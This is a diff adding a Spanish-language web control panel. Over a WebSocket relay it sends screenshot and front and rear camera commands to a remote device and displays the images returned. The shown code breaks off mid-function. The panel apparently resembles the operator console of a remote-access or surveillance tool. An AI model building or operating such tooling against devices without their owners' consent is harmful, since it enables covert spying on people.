@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control Multimedia</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        h1 { color: #9b59b6; margin-bottom: 10px; }
+        .estado-contenedor {
+            margin-bottom: 20px;
+            font-size: 1.1em;
+        }
+        .indicador {
+            font-weight: bold;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        .desconectado { background-color: #c0392b; color: #fff; }
+        .conectado { background-color: #2ecc71; color: #fff; }
+        
+        .panel-principal {
+            display: flex;
+            gap: 20px;
+            max-width: 1000px;
+            width: 100%;
+        }
+        .seccion-izquierda {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .visor-imagen {
+            flex: 1.5;
+            background-color: #111;
+            border: 2px dashed #444;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            min-height: 400px;
+        }
+        .visor-imagen img {
+            max-width: 100%;
+            max-height: 500px;
+            border-radius: 4px;
+            display: none;
+        }
+        .placeholder-texto {
+            color: #666;
+            font-style: italic;
+        }
+        button {
+            background-color: #8e44ad;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1em;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        button:hover { background-color: #9b59b6; }
+        button:active { background-color: #7d3c98; }
+        
+        .consola {
+            background-color: #000;
+            border: 1px solid #333;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 10px;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 0.9em;
+            color: #2ecc71;
+        }
+        .log-linea { margin: 4px 0; }
+    </style>
+</head>
+<body>
+
+    <h1>Panel Web de Control</h1>
+    
+    <div class="estado-contenedor">
+        Estado del Dispositivo: <span id="estado-dispositivo" class="indicador desconectado">DESCONECTADO</span>
+    </div>
+
+    <div class="panel-principal">
+        <div class="seccion-izquierda">
+            <button onclick="enviarOrden('SCREENSHOT')">📸 Capturar Pantalla</button>
+            <button onclick="enviarOrden('CAMARA_TRASERA')">📷 Disparar Cámara Trasera</button>
+            <button onclick="enviarOrden('CAMARA_FRONTAL')">🤳 Disparar Cámara Frontal</button>
+            
+            <h3>Registro de Consola (Logs)</h3>
+            <div id="consola-logs" class="consola">
+                <div class="log-linea">[SISTEMA] Iniciando panel de control web...</div>
+            </div>
+        </div>
+
+        <div class="visor-imagen">
+            <span id="txt-placeholder" class="placeholder-texto">Esperando transmisión de imagen...</span>
+            <img id="pantalla-monitor" src="" alt="Transmisión en vivo">
+        </div>
+    </div>
+
+    <script>
+        // Configurar la URL de los WebSockets detectando el protocolo automáticamente (http -> ws o https -> wss)
+        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+        const wsUrl = protocol + window.location.host;
+        let socket;
+
+        function conectarWebSocket() {
+            socket = new WebSocket(wsUrl);
+
+            socket.onopen = () => {
+                agregarLog("[SISTEMA] Conectado al servidor en la nube. Sincronizando...");
+                // Registrar esta ventana como el Monitor que envía las órdenes
+                socket.send(JSON.stringify({ tipo: 'REGISTRO_MONITOR' }));
+            };
+
+            socket.onmessage = (event) => {
+                try {
+                    const datos = JSON.parse(event.data);
+
+                    if (datos.tipo === 'ESTADO') {
+                        actualizarEstatus(datos.estatus);
+                    } 
+                    else if (datos.tipo === 'DISPLAY_IMAGEN') {
+                        const img = document.getElementById('pantalla-monitor');
+                        const placeholder = document.getElementById('txt-placeholder');
+                        
+                        img.src = "data:image/png;base64," + datos.base64;
+                        img.style.display = "block";
+                        placeholder.style.display = "none";
+                        agregarLog("[SISTEMA] Monitor multimedia actualizado.");
+                    } 
+                    else if (datos.tipo === 'CONSOLA') {
+                        agregarLog("> " + datos.msg);
+                    }
+                } catch (e) {
+                    // Ignorar respuestas que no correspondan a la estructura JSON esperada
+                }
+            };
+
+            socket.onclose = () => {
+                actualizarEstatus('DESCONECTADO');
+                agregarLog("[ALERTA] Conexión perdida con la nube. Reconectando en 3s...");
+                setTimeout(conectarWebSocket, 3000);
+            };
+        }
+
+        function enviarOrden(nombreComando) {
+            if (socket && socket.readyState === WebSocket.OPEN) {
+                agregarLog(`[SISTEMA] Solicitando ${nombreComando}...`);
+                socket.send(JSON.stringify({ tipo: 'ACCION', comando: nombreComando }));
+            } else {
+                alert("No hay conexión activa con el servidor.");
+            }
+        }
+
+        function actualizarEstatus(estatus) {
+            const indicador = document.getElementById('estado-dispositivo');
+            if (estatus === 'CONECTADO') {
+                indicador.innerText = "CONECTADO";
+                indicador.className = "indicador conectado";
+            } else {
+                indicador.innerText = "DESCONECTADO";
+                indicador.className = "indicador desconectado";
+            }
+        }
+
+        function agregarLog(texto) {
+            const consola = document.getElementById('consola-logs');
+            const nuevaLinea = document.createElement('div');
+            nuevaLinea.className = 'log-linea';
+            nuevaLinea.innerText = texto;
